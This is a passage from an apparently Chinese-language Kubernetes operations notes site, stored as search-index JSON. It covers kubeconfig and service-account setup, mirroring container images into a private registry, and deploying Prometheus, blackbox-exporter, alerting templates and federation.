demo\n\n# \u8bbe\u7f6e\u96c6\u7fa4\u53c2\u6570\nexport KUBE_APISERVER=\"https://10.101.11.240:6443\"\nkubectl config set-cluster kubernetes \\\n--certificate-authority=/etc/kubernetes/pki/ca.crt \\\n--embed-certs=true \\\n--server=${KUBE_APISERVER} \\\n--kubeconfig=demo.kubeconfig\n\n# \u8bbe\u7f6e\u5ba2\u6237\u7aef\u8ba4\u8bc1\u53c2\u6570\nkubectl config set-credentials demo \\\n--client-certificate=demo.pem \\\n--client-key=demo-key.pem \\\n--embed-certs=true \\\n--token=bearer_token \\\n--kubeconfig=demo.kubeconfig\n\n# \u8bbe\u7f6e\u4e0a\u4e0b\u6587\u53c2\u6570\nkubectl config set-context kubernetes \\\n--cluster=kubernetes \\\n--user=demo \\\n--kubeconfig=demo.kubeconfig\n\n# \u8bbe\u7f6e\u9ed8\u8ba4\u4e0a\u4e0b\u6587\nkubectl config use-context kubernetes --kubeconfig=demo.kubeconfig\n\n# kubectl create crolebinding demo-binding --clusterrole=admin --user=demo --namespace=default\n\nkubectl create serviceaccount demo \n\nkubectl create clusterrolebinding demo-binding --clusterrole=cluster-admin --user=demo \n\nkubectl describe secrets $(kubectl get secret | awk '/demo/{print $1}')\n\n----\nkubectl create serviceaccount demo -n kube-server\nkubectl create clusterrolebinding demo \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=kube-server:demo\nkubectl describe secrets \\\n  -n kube-server $(kubectl -n kube-server get secret | awk '/demo/{print $1}')\n#kubectl -n kube-system get secret admin-token-nwphb -o jsonpath={.data.token}|base64 -d\n</code></pre>"},{"location":"kubernetes/09-account/#m2","title":"M2","text":"<pre><code>cat &gt; demo.kubeconfig &lt;&lt;EOF\napiVersion: v1\nkind: Config\npreferences: {}\n\nclusters:\n- cluster:\n  name: kubernetes\n\nusers:\n- name: lab-admin\n- name: lab-guest\n\ncontexts:\n- context:\n  name: lab\n- context:\n  name: lab01\n- context:\n  name: lab02\nEOF\n\nkubectl config --kubeconfig=demo.kubeconfig \\\n    set-cluster kubernetes \\\n    --embed-certs=true \\\n    --server=https://10.101.11.240:6443 \\\n    --certificate-authority=/etc/kubernetes/pki/ca.crt\n\nkubectl config --kubeconfig=demo.kubeconfig \\\n    set-credentials experimenter \\\n    --username=exp --password=some-password\n\nkubectl config --kubeconfig=demo.kubeconfig \\\n    set-context lab \\\n    --cluster=kubernetes \\\n#    --namespace=default \\\n    --user=lab-admin\n\nkubectl --kubeconfig=demo.kubeconfig config use-context lab\n\nkubectl --kubeconfig=demo.kubeconfig config view --minify\n\nkubectl -n kube-server create serviceaccount lab-admin\nkubectl create clusterrolebinding lab-admin-binding \\\n        --clusterrole=cluster-admin \\\n      --serviceaccount=kube-server:lab-admin\n</code></pre>"},{"location":"kubernetes/10-access-image/","title":"\u52a0\u901f\u955c\u50cf","text":"<p>\u8bbf\u95ee\u955c\u50cf\u7684\u76ee\u6807\u5730\u5740\u662f\u6309\u955c\u50cf\u5730\u5740\u4e2d\u4e3b\u673a\u90e8\u5206\u6765\u5bfb\u5740\uff0c\u7f3a\u7701\u65f6\u662f<code>hub.docker.com</code>\uff0c\u8003\u8651\u5230\u5f88\u591a\u79c1\u6709\u5316\u90e8\u7f72\u65f6\u4e0b\u8f7d\u955c\u50cf\u901f\u5ea6\u8fc7\u6162\u3002</p> <p>\u8bbf\u95ee\u8fc7\u6162\u7684\u539f\u56e0\u65e0\u5916\u4e4e\uff0c\u8d44\u6e90\u5728\u56fd\u5916\u6216\u8005\u79c1\u6709\u5316\u51fa\u53e3\u7f51\u7edc\u8d44\u6e90\u8fc7\u7a84\u3002</p> <p>\u73b0\u6574\u7406\u5e38\u7528\u52a0\u901f\u65b9\u5f0f</p> <ul> <li>\u5207\u6362\u5230\u955c\u50cf\u7ad9</li> <li>\u4e0b\u8f7d\u5230\u79c1\u6709\u5e93</li> <li>\u4f7f\u7528\u4ee3\u7406\u901a\u9053</li> </ul>"},{"location":"kubernetes/10-access-image/#_2","title":"\u4e00\u3001\u5207\u6362\u5230\u955c\u50cf\u7ad9","text":"<p>\u955c\u50cf\u7ad9\u4f1a\u5c06\u76ee\u6807\u6e90\u7ad9\u7684\u8d44\u6e90\u7f13\u5b58\u8d77\u6765\uff0c\u5e76\u4f18\u5316\u5206\u53d1\u901f\u5ea6\u3002</p> <p>\u6211\u4eec\u5e38\u4f7f\u7528\u7684\u955c\u50cf\u7ad9</p> <ul> <li>\u963f\u91cc<code>registry.aliyun.com</code></li> <li>\u817e\u8baf</li> <li>\u7f51\u6613</li> <li>\u6559\u80b2</li> </ul>"},{"location":"kubernetes/10-access-image/#_3","title":"\u4e8c\u3001\u4e0b\u8f7d\u5230\u79c1\u6709\u5e93","text":"<p>\u5728\u79c1\u6709\u7f51\u7edc\u73af\u5883\u81ea\u5efa\u5b58\u50a8\u5e93\uff0c\u5e38\u7528\u5b58\u50a8\u5e93Harbor\u3002</p> <p>\u4ece\u5916\u90e8\u5c06\u955c\u50cf\u7ad9\u4e0b\u8f7d\u5e76\u4e0a\u4f20\u81f3\u79c1\u6709\u5b58\u50a8\u5e93\u3002</p>"},{"location":"kubernetes/10-access-image/#21","title":"2.1 \u624b\u52a8","text":"<p>\u5c06\u5916\u90e8\u955c\u50cf\u4ea7\u7269\u62c9\u5230\u79c1\u6709\u73af\u5883\u7f13\u5b58\u8d77\u6765\u4e0b\u8f7d\u811a\u672c</p> <pre><code>#!/bin/bash\n\n#\n# usage\n#  pull_image_to_local.sh kubernetesui/metrics-scraper:v1.0.7\n#  pull_image_to_local.sh registry.cn-hangzhou.aliyuncs.com/google_containers/nginx-ingress-controller:v1.1.0\n#  pull_image_to_local.sh nginx:1.21.4 third\n#\n# explain\n#  docker pull kubernetesui/metrics-scraper:v1.0.7\n#  docker tag kubernetesui/metrics-scraper:v1.0.7 hub.8ops.top/google_containers/metrics-scraper:v1.0.7\n#  docker push hub.8ops.top/google_containers/metrics-scraper:v1.0.7\n#  docker rmi kubernetesui/metrics-scraper:v1.0.7\n#  docker rmi hub.8ops.top/google_containers/metrics-scraper:v1.0.7\n#\n\nset -e\n\nsrc=$1\ndst=$2\nharbor=hub.8ops.top\n[ -z ${dst} ] &amp;&amp; dst=google_containers\ndocker pull ${src}\ndocker tag ${src} `echo ${src} |awk -v harbor=${harbor} -v dst=${dst} -F'/' '{printf(\"%s/%s/%s\",harbor,dst,$NF)}'`\ndocker push `echo ${src} |awk -v harbor=${harbor} -v dst=${dst} -F'/' '{printf(\"%s/%s/%s\",harbor,dst,$NF)}'`\ndocker rmi ${src}\ndocker rmi `echo ${src} |awk -v harbor=${harbor} -v dst=${dst} -F'/' '{printf(\"%s/%s/%s\",harbor,dst,$NF)}'`\n</code></pre>"},{"location":"kubernetes/10-access-image/#22-image-syncer","title":"2.2 image-syncer","text":"<p>image-syncer\u662f\u4e2a\u4e0d\u9519\u7684\u5de5\u5177</p> <p>auth.json</p> <pre><code>{\n  \"hub.8ops.top\": {\n    \"username\": \"\",\n    \"password\": \"\"\n  }\n}\n</code></pre> <p>images.json</p> <pre><code>{\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.23.0\": \"hub.8ops.top/google_containers/kube-apiserver\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.23.0\": \"hub.8ops.top/google_containers/kube-controller-manager\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler:v1.23.0\": \"hub.8ops.top/google_containers/kube-scheduler\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.23.0\": \"hub.8ops.top/google_containers/kube-proxy\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:1.8.6\": \"hub.8ops.top/google_containers/coredns\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.5.1-0\": \"hub.8ops.top/google_containers/etcd\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.6\": \"hub.8ops.top/google_containers/pause\"\n}\n</code></pre> <p>\u9700\u8981\u5b58\u5728\u9879\u76ee <code>hub.8ops.top/google_containers</code> \uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u540c\u6b65\u4e0d\u6210\u529f\u60c5\u51b5</p> <pre><code>image-syncer --auth=auth.json --images=images.json --arch=amd64 --os=linux\n</code></pre> <p>\u4e00\u5b9a\u8981\u6307\u5b9a**arch**\uff0c\u5426\u5219\u4f1a\u540c\u6b65\u975e\u9884\u671f\u7684arch\u955c\u50cf\u4ea7\u7269\u8fc7\u6765</p>"},{"location":"kubernetes/10-access-image/#_4","title":"\u4e09\u3001\u4f7f\u7528\u4ee3\u7406\u901a\u9053","text":"<p>\u539f\u7406\u662f\u7f51\u7edc\u5c42\u9762\u7684\u4ee3\u7406\u8bbf\u95ee\u3002</p>"},{"location":"kubernetes/10-access-image/#31","title":"3.1 \u7cfb\u7edf\u4ee3\u7406","text":"<p>\u4ece\u7cfb\u7edf\u5c42\u9762\u4f7f\u7528\u7f51\u7edc\u4ee3\u7406</p> <pre><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n</code></pre>"},{"location":"kubernetes/10-access-image/#32","title":"3.2 \u5de5\u5177\u4ee3\u7406","text":"<p>\u5728\u4e0b\u8f7d\u955c\u50cf\u7684\u4f4d\u7f6e\u4f7f\u7528\u7f51\u7edc\u4ee3\u7406\u52a0\u901f\u8bbf\u95ee\u901f\u5ea6\u3002</p> <p>\u5e38\u7528\u7684\u4f4d\u7f6e</p> <ul> <li>dockerd</li> <li>containerd</li> </ul> <pre><code># ~/.docker/config.json\n{\n \"proxies\":\n {\n   \"default\":\n   {\n     \"httpProxy\": \"http://192.168.1.12:3128\",\n     \"httpsProxy\": \"http://192.168.1.12:3128\",\n     \"noProxy\": \"*.test.example.com,.example2.com,127.0.0.0/8\"\n   }\n }\n}\n</code></pre>"},{"location":"kubernetes/20-prometheus/","title":"Helm + Prometheus","text":"<p>\u5728\u300aSRE: Google\u8fd0\u7ef4\u89e3\u5bc6\u300b\u4e00\u4e66\u4e2d\u6307\u51fa\uff0c\u76d1\u63a7\u7cfb\u7edf\u9700\u8981\u80fd\u591f\u6709\u6548\u7684\u652f\u6301\u767d\u76d2\u76d1\u63a7\u548c\u9ed1\u76d2\u76d1\u63a7\u3002\u901a\u8fc7\u767d\u76d2\u80fd\u591f\u4e86\u89e3\u5176\u5185\u90e8\u7684\u5b9e\u9645\u8fd0\u884c\u72b6\u6001\uff0c\u901a\u8fc7\u5bf9\u76d1\u63a7\u6307\u6807\u7684\u89c2\u5bdf\u80fd\u591f\u9884\u5224\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898\uff0c\u4ece\u800c\u5bf9\u6f5c\u5728\u7684\u4e0d\u786e\u5b9a\u56e0\u7d20\u8fdb\u884c\u4f18\u5316\u3002\u800c\u9ed1\u76d2\u76d1\u63a7\uff0c\u5e38\u89c1\u7684\u5982HTTP\u63a2\u9488\uff0cTCP\u63a2\u9488\u7b49\uff0c\u53ef\u4ee5\u5728\u7cfb\u7edf\u6216\u8005\u670d\u52a1\u5728\u53d1\u751f\u6545\u969c\u65f6\u80fd\u591f\u5feb\u901f\u901a\u77e5\u76f8\u5173\u7684\u4eba\u5458\u8fdb\u884c\u5904\u7406\u3002\u901a\u8fc7\u5efa\u7acb\u5b8c\u5584\u7684\u76d1\u63a7\u4f53\u7cfb\uff0c\u4ece\u800c\u8fbe\u5230\u4ee5\u4e0b\u76ee\u7684\uff1a</p> <ul> <li>\u957f\u671f\u8d8b\u52bf\u5206\u6790\uff1a\u901a\u8fc7\u5bf9\u76d1\u63a7\u6837\u672c\u6570\u636e\u7684\u6301\u7eed\u6536\u96c6\u548c\u7edf\u8ba1\uff0c\u5bf9\u76d1\u63a7\u6307\u6807\u8fdb\u884c\u957f\u671f\u8d8b\u52bf\u5206\u6790\u3002\u4f8b\u5982\uff0c\u901a\u8fc7\u5bf9\u78c1\u76d8\u7a7a\u95f4\u589e\u957f\u7387\u7684\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u9884\u6d4b\u5728\u672a\u6765\u4ec0\u4e48\u65f6\u95f4\u8282\u70b9\u4e0a\u9700\u8981\u5bf9\u8d44\u6e90\u8fdb\u884c\u6269\u5bb9\u3002</li> <li>\u5bf9\u7167\u5206\u6790\uff1a\u4e24\u4e2a\u7248\u672c\u7684\u7cfb\u7edf\u8fd0\u884c\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\u7684\u5dee\u5f02\u5982\u4f55\uff1f\u5728\u4e0d\u540c\u5bb9\u91cf\u60c5\u51b5\u4e0b\u7cfb\u7edf\u7684\u5e76\u53d1\u548c\u8d1f\u8f7d\u53d8\u5316\u5982\u4f55\uff1f\u901a\u8fc7\u76d1\u63a7\u80fd\u591f\u65b9\u4fbf\u7684\u5bf9\u7cfb\u7edf\u8fdb\u884c\u8ddf\u8e2a\u548c\u6bd4\u8f83\u3002</li> <li>\u544a\u8b66\uff1a\u5f53\u7cfb\u7edf\u51fa\u73b0\u6216\u8005\u5373\u5c06\u51fa\u73b0\u6545\u969c\u65f6\uff0c\u76d1\u63a7\u7cfb\u7edf\u9700\u8981\u8fc5\u901f\u53cd\u5e94\u5e76\u901a\u77e5\u7ba1\u7406\u5458\uff0c\u4ece\u800c\u80fd\u591f\u5bf9\u95ee\u9898\u8fdb\u884c\u5feb\u901f\u7684\u5904\u7406\u6216\u8005\u63d0\u524d\u9884\u9632\u95ee\u9898\u7684\u53d1\u751f\uff0c\u907f\u514d\u51fa\u73b0\u5bf9\u4e1a\u52a1\u7684\u5f71\u54cd\u3002</li> <li>\u6545\u969c\u5206\u6790\u4e0e\u5b9a\u4f4d\uff1a\u5f53\u95ee\u9898\u53d1\u751f\u540e\uff0c\u9700\u8981\u5bf9\u95ee\u9898\u8fdb\u884c\u8c03\u67e5\u548c\u5904\u7406\u3002\u901a\u8fc7\u5bf9\u4e0d\u540c\u76d1\u63a7\u76d1\u63a7\u4ee5\u53ca\u5386\u53f2\u6570\u636e\u7684\u5206\u6790\uff0c\u80fd\u591f\u627e\u5230\u5e76\u89e3\u51b3\u6839\u6e90\u95ee\u9898\u3002</li> <li>\u6570\u636e\u53ef\u89c6\u5316\uff1a\u901a\u8fc7\u53ef\u89c6\u5316\u4eea\u8868\u76d8\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u6001\u3001\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\u3001\u4ee5\u53ca\u670d\u52a1\u8fd0\u884c\u72b6\u6001\u7b49\u76f4\u89c2\u7684\u4fe1\u606f\u3002</li> </ul> <p>prometheus\u662f\u76ee\u524d\u4eba\u6c14\u8f83\u9ad8\u7684\u4e00\u6b3e\u76d1\u63a7\u8f6f\u4ef6\uff0c\u6d3b\u8dc3\u7684\u793e\u533a\u5438\u5f15\u4e86\u65e0\u6570\u7684geeker\u3002\u5f53\u7136\u4e1a\u5185\u5e38\u7528\u7684\u76d1\u63a7\u7cfb\u7edf\u8fd8\u6709nagios\u3001zabbix\u3002</p> <p>\u5927\u81f4\u539f\u7406\u662f\u6570\u636e\u91c7\u96c6\u7aef\uff08exporter\uff09\u6ce8\u518c\u5230prometheus\u540e\uff0c\u7531prometheus\u5468\u671f\u62c9\u53d6\u66b4\u9732\u7684metrics\u3002</p> <p></p>"},{"location":"kubernetes/20-prometheus/#_1","title":"\u4e00\u3001\u5355\u4e00\u6a21\u5f0f","text":"<p>\u57fa\u4e8ekubernetes</p> <p></p>"},{"location":"kubernetes/20-prometheus/#11-prometheus","title":"1.1 prometheus","text":"<p>\u901a\u8fc7helm\u5b89\u88c5prometheus</p> <pre><code>helm repo add prometheus-community https://prometheus-community.github.io/helm-charts\nhelm repo update prometheus-community\nhelm search repo prometheus\n\n# prometheus\nhelm show values prometheus-community/prometheus --version 15.8.5 &gt; prometheus.yaml-15.8.5-default\n\n# Example \n#   https://books.8ops.top/attachment/prometheus/helm/prometheus.yaml-15.8.5\n#   https://books.8ops.top/attachment/prometheus/helm/prometheus-extra.yaml\n#   https://books.8ops.top/attachment/prometheus/helm/prometheus-alertmanager.yaml\n#\n\nhelm install prometheus prometheus-community/prometheus \\\n    -f prometheus.yaml-15.8.5 \\\n    -f prometheus-extra.yaml \\\n    -f prometheus-alertmanager.yaml \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 15.8.5 --debug\n\nkubectl -n kube-server scale --replicas=0 deploy prometheus-server\nhelm upgrade --install prometheus prometheus-community/prometheus \\\n    -f prometheus.yaml-15.8.5 \\\n    -f prometheus-extra.yaml \\\n    -f prometheus-alertmanager.yaml \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 15.8.5 --debug\n\nhelm -n kube-server uninstall prometheus \n\n# reset\nhelm -n kube-server uninstall prometheus &amp;&amp; \\\n    kubectl delete -f ../01-persistent-prometheus.yaml &amp;&amp; \\\n    kubectl apply -f ../01-persistent-prometheus.yaml &amp;&amp; \\\n    kubectl get pv,pvc -A\n</code></pre> <p>\u5e38\u7528\u914d\u7f6e</p> <ul> <li>prometheus.yaml</li> <li>alerting_rules.yml</li> <li>recording_rules.yml</li> <li>alertmanager.yml</li> </ul> <p>\u63a8\u8350\u914d\u7f6e\u6307\u5bfc</p> <p>awesone prometheus alerts</p> <p>\u91ca\u653e\u6301\u4e45\u5316\u5377</p> <pre><code>kubectl edit pv xxx\n  finalizers:\n  - kubernetes.io/pv-protection\n  ...\n  # upgraded\n  finalizers: []\n</code></pre> <p>\u8ba9master\u8282\u70b9\u4e5f\u90e8\u7f72node-exporter</p> <pre><code>...\nnodeExporter:\n  ...\n  tolerations:\n    - key: \"node-role.kubernetes.io/master\"\n      operator: \"Exists\"\n</code></pre> <p>\u91c7\u96c6\u5916\u90e8exporter\u7684metrics</p> <pre><code># \u57fa\u4e8e helm \u4e2d extraScrapeConfigs\nextraScrapeConfigs: |\n    - job_name: 'blackbox'\n      metrics_path: /probe\n      scheme: http\n      params:\n        module: [http_2xx]\n      static_configs:\n        - targets:\n          - http://blackbox-exporter-prometheus-blackbox-exporter:9115\n      relabel_configs:\n        - source_labels: [__address__]\n          target_label: __param_target\n        - source_labels: [__param_target]\n          target_label: instance\n        - target_label: __address__\n          replacement: blackbox-exporter-prometheus-blackbox-exporter:9115\n    - job_name: 'node'\n      honor_timestamps: true\n      scrape_interval: 1m\n      scrape_timeout: 10s\n      metrics_path: /metrics\n      scheme: http\n      static_configs:\n        - targets:\n          - 10.101.11.168:19100\n          - 10.101.11.188:19100\n          - 10.101.11.197:19100\n          - 10.101.11.209:19100\n          - 10.101.11.236:19100\n</code></pre>"},{"location":"kubernetes/20-prometheus/#12-blackbox","title":"1.2 blackbox","text":"<p>blackbox-exporter \u5e38\u7528\u7684\u4e00\u4e2a\u9ed1\u76d2</p> <pre><code>helm search repo prometheus-blackbox-exporter\nhelm show values prometheus-community/prometheus-blackbox-exporter --version 7.0.0 &gt; blackbox-exporter.yaml-7.0.0-default\n\n# Example \n#   https://books.8ops.top/attachment/prometheus/helm/blackbox-exporter.yaml\n\nhelm install blackbox-exporter prometheus-community/prometheus-blackbox-exporter \\\n    -f blackbox-exporter.yaml-7.0.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 7.0.0 --debug\n\nhelm upgrade --install blackbox-exporter prometheus-community/prometheus-blackbox-exporter \\\n    -f blackbox-exporter.yaml-7.0.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 7.0.0 --debug\n\nhelm -n kube-server uninstall blackbox-exporter \n</code></pre>"},{"location":"kubernetes/20-prometheus/#13-grafana","title":"1.3 grafana","text":"<p>Reference</p> <pre><code># templ\n\n## kubernetes\nKubernetes Cluster \n\nKubernetes cluster monitoring\n\nKubernetes / Node Exporter Full\n\nKubernetes Nodes\n\nkube-state-metrics\n\n## middleware\nNGINX Ingress controller\n\nMySQL Overview\n\nRedis Dashboard for Prometheus Redis Exporter\n</code></pre>"},{"location":"kubernetes/20-prometheus/#14-alertcenter","title":"1.4 alertcenter","text":"<p>\u544a\u8b66\u5168\u5bb6\u6876</p> <p>\u63a8\u8350 prometheus-alert-center</p> <p>\u7b2c\u4e00\u6b65\uff0c\u51c6\u5907</p> <p>\u4f01\u4e1a\u5fae\u4fe1\u673a\u5668\u4eba\u56de\u8c03\u5730\u5740</p> <pre><code>https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxxx-xx-xx-xxxx\n</code></pre> <p>\u521b\u5efa\u6570\u636e\u5e93</p> <pre><code># MySQL 8\n\ncreate database prometheus_alert;\ncreate user 'prometheus_alert'@'%' identified by 'prometheus_alert';\ngrant all privileges on prometheus_alert.* to `prometheus_alert`@`%`;\nflush privileges;\n</code></pre> <p>\u7b2c\u4e8c\u6b65\uff0c\u542f\u52a8</p> <p>\u914d\u7f6eYaml</p> <pre><code>kubectl apply -f 95-prometheus-alert-center.yaml\n</code></pre> <p>\u7b2c\u4e09\u6b65\uff0c\u521d\u59cb\u6570\u636e</p> <pre><code>mysql -uprometheus_alert -pprometheus_alert -Dprometheus_alert &lt; prometheusalert.sql\n</code></pre> <p>\u7b2c\u56db\u6b65\uff0c\u6dfb\u52a0\u6a21\u677f</p> <p>\u4f01\u4e1a\u5fae\u4fe1</p> <pre><code># \u6a21\u7248\u540d\u79f0\uff1aprometheus-wx-v2\n\n# \u6a21\u7248\u5185\u5bb9\n{{$var:=.commonLabels}}{{ range $k,$v:=.alerts }}{{if  eq $v.status \"resolved\"}}&lt;font color=\"info\"&gt;**\u3010\u6062\u590d\u3011**&lt;/font&gt;**{{$v.labels.alertname}}**\n&gt; &lt;font color=\"info\"&gt;\u7ea7\u522b\uff1a&lt;/font&gt;{{$v.labels.severity}}\n&gt; &lt;font color=\"info\"&gt;\u73af\u5883\uff1a&lt;/font&gt;{{GetString $v.labels.env}}\n&gt; &lt;font color=\"info\"&gt;\u6301\u7eed\uff1a&lt;/font&gt;{{GetTimeDuration $v.startsAt}}\n&gt; &lt;font color=\"info\"&gt;\u5f00\u59cb\uff1a&lt;/font&gt;{{GetCSTtime $v.startsAt}}\n&gt; &lt;font color=\"info\"&gt;\u4e3b\u673a\uff1a&lt;/font&gt;{{GetString $v.labels.ip}}\n&gt; {{$v.annotations.description}}{{else}}&lt;font color=\"warning\"&gt;**\u3010\u544a\u8b66\u3011**&lt;/font&gt;** {{$v.labels.alertname}} **\n&gt; &lt;font color=\"warning\"&gt;\u7ea7\u522b\uff1a&lt;/font&gt;{{$v.labels.severity}}\n&gt; &lt;font color=\"warning\"&gt;\u73af\u5883\uff1a&lt;/font&gt;{{GetString $v.labels.env}}\n&gt; &lt;font color=\"warning\"&gt;\u6301\u7eed\uff1a&lt;/font&gt;{{GetTimeDuration $v.startsAt}}\n&gt; &lt;font color=\"warning\"&gt;\u5f00\u59cb\uff1a&lt;/font&gt;{{GetCSTtime $v.startsAt}}\n&gt; &lt;font color=\"warning\"&gt;\u4e3b\u673a\uff1a&lt;/font&gt;{{GetString $v.labels.ip}}\n&gt; {{$v.annotations.description}}\n&gt; {{ $urimsg:=\"\"}}{{ range $key,$value:=$var }}{{$urimsg =  print $urimsg $key \"%3D%22\" $value \"%22%2C\" }}{{end}}[\u261e\u70b9\u6211\u5c4f\u853d\u8be5\u544a\u8b66\u261c](https://alertmanager-ops.{{$v.labels.env}}.8ops.top/#/silences/new?filter=%7B{{SplitString $urimsg 0 -3}}%7D){{end}}{{end}}\n</code></pre> <p>\u963f\u91cc\u77ed\u4fe1</p> <pre><code># \u6a21\u7248\u540d\u79f0\uff1aprometheus-aly-dx\n\n# \u6a21\u7248\u5185\u5bb9\n{{ range $k,$v:=.alerts }}{{if eq $v.status \"resolved\"}}\u6062\u590d/{{$v.labels.alertname}}\n\u73af\u5883\uff1a{{GetString $v.labels.env}}\n\u6301\u7eed\uff1a{{GetTimeDuration $v.startsAt}}\n\u4e3b\u673a\uff1a{{GetString $v.labels.ip}}\n{{$v.annotations.summary}}{{else}}\u544a\u8b66/{{$v.labels.alertname}}\n\u73af\u5883\uff1a{{GetString $v.labels.env}}\n\u6301\u7eed\uff1a{{GetTimeDuration $v.startsAt}}\n\u4e3b\u673a\uff1a{{GetString $v.labels.ip}}\n{{$v.annotations.summary}}{{end}}{{end}}\n</code></pre> <ul> <li>\u963f\u91cc\u77ed\u4fe1\u5185\u5bb9\u4e2d\u4e0d\u5141\u8bb8\u6709\u7279\u6b8a\u5b57\u7b26<code>\u3010,\u3011</code></li> </ul> <p>\u7b2c\u4e94\u6b65\uff0c\u8054\u52a8AlertManager</p> <pre><code># kubectl -n kube-server edit cm prometheus-alertmanager\n\nglobal:\n  resolve_timeout: 5m\nroute:\n  receiver: discard\n  group_by:\n  - alertname\n  - severity\n  continue: false\n  routes:\n  - receiver: prometheusalertcenter\n    match_re:\n      severity: critical\n    continue: true\n  group_wait: 30s\n  group_interval: 5m\n  repeat_interval: 4h\ninhibit_rules:\n- source_match:\n    severity: critical\n  target_match_re:\n    severity: critical\n  equal:\n  - node\n  - instance\n  - alertname\n- source_match:\n    severity: critical\n  target_match_re:\n    severity: warning\n  equal:\n  - node\n  - instance\n  - alertname\nreceivers:\n- name: discard\n- name: prometheusalertcenter\n  webhook_configs:\n  - send_resolved: true\n    http_config:\n      follow_redirects: true\n    url: http://prometheus-alert-center:8080/prometheusalert?type=wx&amp;tpl=prometheus-wx-v2\n    max_alerts: 0\ntemplates:\n- /opt/metadata/templates.d/*.tmpl\n</code></pre> <p>\u4f01\u4e1a\u5fae\u4fe1 Alert \u6548\u679c</p> <p></p>"},{"location":"kubernetes/20-prometheus/#_2","title":"\u4e8c\u3001\u8054\u90a6\u6a21\u5f0f","text":"<p>\u591a\u4e1a\u52a1\u96c6\u7fa4\u4e0b\u72ec\u7acb\u5b58\u5728prometheus\u573a\u666f</p> <p></p> <p>\u610f\u4e49 </p> <ul> <li>\u96c6\u4e2d\u67e5\u770b\u6570\u636e</li> <li>\u5907\u4efd\u91c7\u96c6\u6570\u636e</li> </ul> <pre><code># \u4e0b\u8f7d\u6700\u65b0\u4e8c\u8fdb\u5236\u7a0b\u5e8f\nPROMETHEUS_VERSION=2.46.0\nwget -c -q https://github.com/prometheus/prometheus/releases/download/v${PROMETHEUS_VERSION}/prometheus-${PROMETHEUS_VERSION}.linux-amd64.tar.gz \\\n-O prometheus-${PROMETHEUS_VERSION}.linux-amd64.tar.gz\ntar xzf prometheus-${PROMETHEUS_VERSION}.linux-amd64.tar.gz -C .\nmv prometheus-${PROMETHEUS_VERSION}.linux-amd64.tar.gz /usr/local/\nln -s /usr/local/prometheus-${PROMETHEUS_VERSION}.linux-amd64 /usr/local/prometheus\n\n# add prometheus.yml\ncat &gt; /usr/local/prometheus/prometheus.yml &lt;&lt;EOF\nscrape_configs:\n- job_name: prometheus-instance\n  honor_timestamps: true\n  scrape_interval: 1m\n  scrape_timeout: 1m\n  metrics_path: /metrics\n  scheme: https\n  tls_config:\n    insecure_skip_verify: true\n  follow_redirects: true\n  enable_http2: true\n  static_configs:\n  - targets:\n    - prometheus-ops.8ops.top\n- job_name: prometheus-federate\n  honor_labels: true\n  honor_timestamps: true\n  params:\n    match[]:\n    - '{job=~\".*\"}'\n  scrape_interval: 2m\n  scrape_timeout: 2m\n  metrics_path: /federate\n  scheme: https\n  tls_config:\n    insecure_skip_verify: true\n  follow_redirects: true\n  enable_http2: true\n  static_configs:\n  - targets:\n    - prometheus-ops.8ops.top\nEOF\n\n# add prometheus-federation.service\nmkdir -p /data1/lib/prometheus\ncat &gt; /usr/lib/systemd/system/prometheus-federate.service &lt;&lt;EOF\n[Unit]\nDescription=Prometheus main process.\nAfter=network.target\n\n[Service]\nType=simple\nWorkingDirectory=/usr/local/prometheus\nExecStart=/usr/local/prometheus/prometheus \\\\\n        --web.listen-address=0.0.0.0:9091 \\\\\n        --web.page-title=\"Federation\" \\\\\n        --storage.tsdb.retention.time=365d \\\\\n        --config.file=/usr/local/prometheus/prometheus.yml \\\\\n        --storage.tsdb.path=/data1/lib/prometheus \\\\\n        --web.console.libraries=/usr/local/prometheus/console_libraries \\\\\n        --web.console.templates=/usr/local/prometheus/consoles \\\\\n        --web.enable-lifecycle \\\\\n        --web.enable-admin-api \\\\\n        --web.enable-remote-write-receiver\nExecReload=/bin/kill -HUP \\$MAINPID\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl daemon-reload\nsystemctl start prometheus-federate\nsystemctl enable prometheus-federate\nsystemctl is-enabled prometheus-federate\nsystemctl status prometheus-federate\n</code></pre>"},{"location":"kubernetes/20-prometheus/#_3","title":"\u4e09\u3001\u4f7f\u7528\u5411\u5bfc","text":""},{"location":"kubernetes/20-prometheus/#31-scrape","title":"3.1 scrape","text":"<p>configuration</p> <p>Sample</p>"},{"location":"kubernetes/20-prometheus/#32-rules","title":"3.2 rules","text":"<p>configuration</p> <p>Reference</p> <p>Sample</p>"},{"location":"kubernetes/20-prometheus/#33-alertmanager","title":"3.3 alertmanager","text":"<p>configuration</p>"},{"location":"kubernetes/20-prometheus/#exporter","title":"\u56db\u3001exporter","text":""},{"location":"kubernetes/20-prometheus/#41-haproxy","title":"4.1 haproxy","text":"<pre><code>EXPORTER_VERSION=0.15.0\ncurl -s -o /tmp/haproxy_exporter-${EXPORTER_VERSION}.linux-amd64.tar.gz \\\nhttps://github.com/prometheus/haproxy_exporter/releases/download/v${EXPORTER_VERSION}/haproxy_exporter-${EXPORTER_VERSION}.linux-amd64.tar.gz\ntar xzf 